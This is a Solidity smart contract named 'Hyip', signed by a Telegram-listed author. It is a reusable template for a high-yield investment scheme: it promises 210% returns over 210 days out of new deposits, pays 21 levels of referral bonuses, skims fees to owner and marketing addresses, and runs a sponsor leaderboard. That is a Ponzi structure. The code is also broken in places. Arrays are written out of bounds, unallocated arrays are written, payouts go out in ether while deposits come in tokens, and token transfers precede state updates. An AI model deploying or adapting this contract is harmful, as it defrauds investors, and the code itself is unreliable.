// Creator : Grim Reaper
// Telegram : @grimreaper619

// V1.3
// Ypgraded to support token deposit
// Works with ERC 777 token
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/token/ERC777/IERC777.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/introspection/IERC1820Registry.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/token/ERC777/IERC777Recipient.sol";

pragma solidity ^0.5.0;

contract Hyip is IERC777Recipient{
    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    IERC777 private _token;
    event DoneDeposit(address operator, address from, address to, uint256 amount, bytes userData, bytes operatorData);
    using SafeMath for uint256;
    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
        uint256 forRefComp;
    }

    address payable public owner;
    address payable public marketing;

    uint8 public investment_days;
    uint256 public investment_perc;
    uint256 public refCompetitionAmount;
    uint256 public totalCompetitionAmount;
    uint256 public contractStep;
    uint256 public total_investors;
    uint256 public total_invested;
    uint256 public total_withdrawn;
    uint256 public total_referral_bonus;
    uint256 public full_release;
    uint8 public currentRound;
    address[] public allRefs;

    uint8[] public referral_bonuses;
    struct Leaderboard {
            uint256 count;
            address payable addr;
        }

    Leaderboard[10] public topSponsors;
    Leaderboard[10] public previousInfo;

    mapping(address => Player) public players;
    mapping(address => address) public reflist;
    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    constructor(address payable marketingAddress, address token) public {
        owner = msg.sender;
        _token = IERC777(token);
        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        marketing = marketingAddress;
        investment_days = 210;
        investment_perc = 210;
        refCompetitionAmount = 0;
        totalCompetitionAmount = 0;
        contractStep = 100000000000;
        currentRound = 0;

        referral_bonuses.push(100);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);

        full_release = 1600990000; //start date
        for (uint8 i = 0; i< 10; i++)
        {
            topSponsors[i].count = 1;
            topSponsors[i].addr = owner;
        }
    }
    function refCompetition() internal {
        topSponsors[0].addr.transfer(refCompetitionAmount.mul(30).div(100));
        topSponsors[1].addr.transfer(refCompetitionAmount.mul(20).div(100));
        topSponsors[2].addr.transfer(refCompetitionAmount.mul(15).div(100));
        topSponsors[3].addr.transfer(refCompetitionAmount.mul(8).div(100));
        topSponsors[4].addr.transfer(refCompetitionAmount.mul(7).div(100));
        topSponsors[5].addr.transfer(refCompetitionAmount.mul(6).div(100));
        topSponsors[6].addr.transfer(refCompetitionAmount.mul(5).div(100));
        topSponsors[7].addr.transfer(refCompetitionAmount.mul(4).div(100));
        topSponsors[8].addr.transfer(refCompetitionAmount.mul(3).div(100));
        topSponsors[9].addr.transfer(refCompetitionAmount.mul(2).div(100));
        totalCompetitionAmount += refCompetitionAmount;
        previousInfo = topSponsors;
        refCompetitionAmount = 0;
        currentRound++;
        uint256 len = allRefs.length;
        for(uint256 i=0; i<len;i++){
            players[allRefs[i]].forRefComp = 0;
        }
        for (uint8 i = 0; i< 10; i++)
        {
            topSponsors[i].count = 1;
            topSponsors[i].addr = owner;
        }
    }
    function setref(address ref) external {
        require(msg.sender != ref,"Self referring not allowed");
        require(reflist[msg.sender] == address(0), "Referral already set");
        reflist[msg.sender] = ref;
    }
    
    function tokensReceived(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external {
        require(msg.sender == address(_token), "Simple777Recipient: Invalid token");
        if(reflist[from] == address(0)){
            reflist[from] = owner;
        }
        deposit(from,amount,reflist[from]);
    }
    
    function deposit(address sender, uint256 amt, address _referral) internal {
        require(uint256(block.timestamp) > full_release, "Not launched");
        require(amt >= 1e7, "Zero amount");
        require(amt >= 100000000, "Minimal deposit: 100 TOKEN"); //Edit here according to your need
        require(amt <= 1000000000000, "Maximal deposit: 1000000 TOKEN"); //Edit here according to your need
        Player storage player = players[sender];
        require(player.deposits.length < 100,"Max 100 deposits per address");

        _setReferral(sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: amt,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += amt;
        total_invested += amt;

        _referralPayout(sender, amt);

        _token.send(owner,amt.mul(3).div(100),"Owner Share"); // 3% for owner
        _token.send(marketing,amt.mul(6).div(100),"Marketing Share"); // 6% for marketing
        refCompetitionAmount += amt.mul(1).div(100); // 1% for ref competition
        if(refCompetitionAmount >= contractStep){
            refCompetition();
        }

        emit Deposit(sender, amt);
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;
            players[_referral].forRefComp++;
            uint256 count = allRefs.length;
            bool flag = false;
            for(uint256 i=0;i<count;i++){
                if(allRefs[i]==_referral){
                    flag = true;
                }
            }
            if(!flag){
                allRefs.push(_referral);
            }
            bool check = checkSponsor(_referral);
            for(uint8 i = 0; i < 21; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    function checkSponsor(address _add) private returns(bool) {
        address payable[10] memory initarray;
        uint8 i;
        for(i=0;i<10;i++){
            initarray[i] = topSponsors[i].addr;
        }
        uint256 sponsors = players[_add].forRefComp;
        if(topSponsors[9].count > sponsors ){
            return false;
        }
        address payable tempaddr = address(uint160(_add));
        if(sponsors > topSponsors[0].count){
            topSponsors[0].count = sponsors;
            topSponsors[0].addr = tempaddr;
            for(i=1;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[1].count){
            topSponsors[1].count = sponsors;
            topSponsors[1].addr = tempaddr;
            for(i=2;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[2].count){
            topSponsors[2].count = sponsors;
            topSponsors[2].addr = tempaddr;
            for(i=3;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[3].count){
            topSponsors[3].count = sponsors;
            topSponsors[3].addr = tempaddr;
            for(i=4;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[4].count){
            topSponsors[4].count = sponsors;
            topSponsors[4].addr = tempaddr;
            for(i=5;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[5].count){
            topSponsors[5].count = sponsors;
            topSponsors[5].addr = tempaddr;
            for(i=6;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[6].count){
            topSponsors[6].count = sponsors;
            topSponsors[6].addr = tempaddr;
            for(i=7;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[7].count){
            topSponsors[7].count = sponsors;
            topSponsors[7].addr = tempaddr;
            for(i=8;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else if(sponsors > topSponsors[8].count){
            topSponsors[8].count = sponsors;
            topSponsors[8].addr = tempaddr;
            for(i=9;i<10;i++){
                topSponsors[i].addr = initarray[i-1];
            }
        }
        else{
            topSponsors[9].count = sponsors;
            topSponsors[9].addr = tempaddr;
        }
        return true;
    }

    function _referralPayout(address _addr, uint256 _amount) private {
        address payable ref =  address(uint160(players[_addr].referral));
        uint256 bonus;
        for(uint8 i = 0; i < 21; i++) {
            if(ref == address(0)) break;
            if(i== 0){
            bonus = _amount * referral_bonuses[i] / 1000; 
            }
            else{
                bonus = bonus * referral_bonuses[i] / 1000;
            }
            if(bonus < 10000 ) break;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;
            _token.send(ref,bonus,"Referral Bonus");
            emit ReferralPayout(ref, bonus, (i+1));
            ref =  address(uint160(players[ref].referral));
        }
    }

    function withdraw() payable external {
        require(uint256(block.timestamp) > full_release, "Not launched");
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0, "Zero amount");

        uint256 amount = player.dividends;

        player.dividends = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;

        _token.send(msg.sender,amount,"Payout");

        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    function getContractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus, uint256 contractBalance,uint256 total_bonus) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus, address(this).balance, totalCompetitionAmount);
    }

    function getUserInfo(address _addr) view external returns(uint256 for_withdraw, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals, uint8 position, uint256 bonus) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        for(uint8 i = 0; i < 21; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        uint8 standing = 0;
        for(uint8 i=0; i<10;i++){
            if(topSponsors[i].addr == _addr){
                standing = i+1;
            }
        }
        return (
            payout + player.dividends,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            standing,
            refCompetitionAmount
        );
    }

    function getUserDeposits(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
    function getUserReferralInfo(address _addr) view external returns( uint256 refs, uint256[] memory refperlevel ){
        uint256 total = 0;
        for(uint8 i=0; i<21;i++){
            refperlevel[i] = players[_addr].referrals_per_level[i];
            total += players[_addr].referrals_per_level[i];
        }
        return(
            total,
            refperlevel
            );
        
    }
    function getContestInfo() view external returns( uint256 amount, address[10] memory  currentadd, address[10] memory previousadd){
        for(uint8 i=0;i<10;i++){
            currentadd[i] = topSponsors[i].addr;
            previousadd[i] = previousInfo[i].addr;
        }
        return(
          refCompetitionAmount,
          currentadd,
          previousadd
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}